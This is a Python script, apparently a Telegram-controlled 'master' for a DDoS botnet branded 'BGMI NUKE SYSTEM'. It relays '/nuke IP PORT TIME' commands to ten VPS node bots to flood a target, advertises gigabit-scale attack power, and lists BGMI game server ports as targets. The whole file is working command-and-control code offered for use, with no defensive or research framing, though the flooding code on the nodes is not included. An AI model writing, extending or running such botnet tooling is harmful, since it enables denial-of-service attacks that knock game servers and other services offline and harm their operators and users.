#!/usr/bin/env python3
"""
MASTER CONTROLLER - Telegram se control karo
Ek command se 10 VPS attack!
"""

import asyncio, time
from telethon import TelegramClient, events, Button
from colorama import Fore, Style, init
import config

init(autoreset=True)

class Master:
    def __init__(self):
        self.bot = TelegramClient('master_session', config.API_ID, config.API_HASH)
        self.nodes_online = 0
        self.attacking = False
    
    async def send_to_nodes(self, cmd):
        """Sab nodes ko command bhejo"""
        results = []
        for i, token in enumerate(config.NODE_TOKENS):
            try:
                node = TelegramClient(f'tmp_{i}', config.API_ID, config.API_HASH)
                await node.start(bot_token=token)
                await node.send_message(config.ADMIN_ID, cmd)
                await node.disconnect()
                results.append(f"✅ Node-{i+1}")
                self.nodes_online += 1
            except:
                results.append(f"❌ Node-{i+1}")
        return results
    
    async def check_nodes(self):
        """Check online nodes"""
        self.nodes_online = 0
        for i, token in enumerate(config.NODE_TOKENS):
            try:
                node = TelegramClient(f'chk_{i}', config.API_ID, config.API_HASH)
                await node.start(bot_token=token)
                await node.disconnect()
                self.nodes_online += 1
            except:
                pass
        return self.nodes_online

master = Master()

# ═══════════ BOT COMMANDS ═══════════

@master.bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id != config.ADMIN_ID:
        return await event.reply("❌ Unauthorized!")
    
    online = await master.check_nodes()
    
    text = f"""
💀 **BGMI NUKE SYSTEM** 💀

📡 Nodes: `{online}/10` Online
⚡ Power: `~{online*3} Gbps`
🧵 Threads: `{online*3000}`

⚔️ **Attack:**
`/nuke IP PORT TIME`

📋 **Example:**
`/nuke 157.240.1.1 8080 300`

🛑 Stop: `/stopall`
📊 Status: `/status`
"""
    
    buttons = [
        [Button.inline("💀 NUKE", b"nuke"), Button.inline("📊 NODES", b"nodes")],
        [Button.inline("⛔ STOP", b"stop"), Button.inline("ℹ️ HELP", b"help")],
    ]
    
    await event.reply(text, buttons=buttons)

@master.bot.on(events.NewMessage(pattern='/nuke'))
async def nuke(event):
    if event.sender_id != config.ADMIN_ID:
        return
    
    if master.attacking:
        return await event.reply("⚠️ Already attacking! /stopall")
    
    parts = event.text.split()
    if len(parts) != 4:
        return await event.reply("/nuke IP PORT TIME\nExample: /nuke 1.2.3.4 8080 300")
    
    ip, port, dur = parts[1], parts[2], parts[3]
    
    msg = await event.reply(f"💀 Nuking {ip}:{port}...")
    results = await master.send_to_nodes(f"/attack {ip} {port} {dur}")
    master.attacking = True
    
    await msg.edit(
        f"💀 **NUKE ACTIVE!**\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"⏱️ `{dur}s`\n"
        f"⚡ `~{master.nodes_online*3} Gbps`\n\n"
        + "\n".join(results) +
        f"\n\n💀 **SERVER FREEZING!**"
    )

@master.bot.on(events.NewMessage(pattern='/stopall'))
async def stopall(event):
    if event.sender_id != config.ADMIN_ID:
        return
    
    results = await master.send_to_nodes("/stop")
    master.attacking = False
    
    await event.reply("⛔ **ALL STOPPED!**\n" + "\n".join(results))

@master.bot.on(events.NewMessage(pattern='/status'))
async def status(event):
    if event.sender_id != config.ADMIN_ID:
        return
    
    online = await master.check_nodes()
    
    await event.reply(
        f"📊 **STATUS**\n\n"
        f"📡 Nodes: `{online}/10`\n"
        f"⚡ Power: `~{online*3} Gbps`\n"
        f"{'🟢 ATTACKING' if master.attacking else '💤 IDLE'}"
    )

@master.bot.on(events.CallbackQuery)
async def buttons(event):
    data = event.data.decode()
    
    if data == "nuke":
        await event.edit("📋 Send: `/nuke IP PORT TIME`")
    elif data == "nodes":
        online = await master.check_nodes()
        await event.edit(f"📡 Nodes Online: `{online}/10`")
    elif data == "stop":
        await stopall(event)
    elif data == "help":
        await event.edit(
            "ℹ️ **HELP**\n\n"
            "`/nuke IP PORT TIME` - Attack\n"
            "`/stopall` - Stop\n"
            "`/status` - Check\n\n"
            "🎮 BGMI Ports: 7000-15000"
        )

async def main():
    await master.bot.start(bot_token=config.MASTER_BOT_TOKEN)
    print(f"[✓] MASTER ONLINE!")
    print(f"[+] /nuke IP PORT TIME")
    await master.bot.run_until_disconnected()

asyncio.run(main())
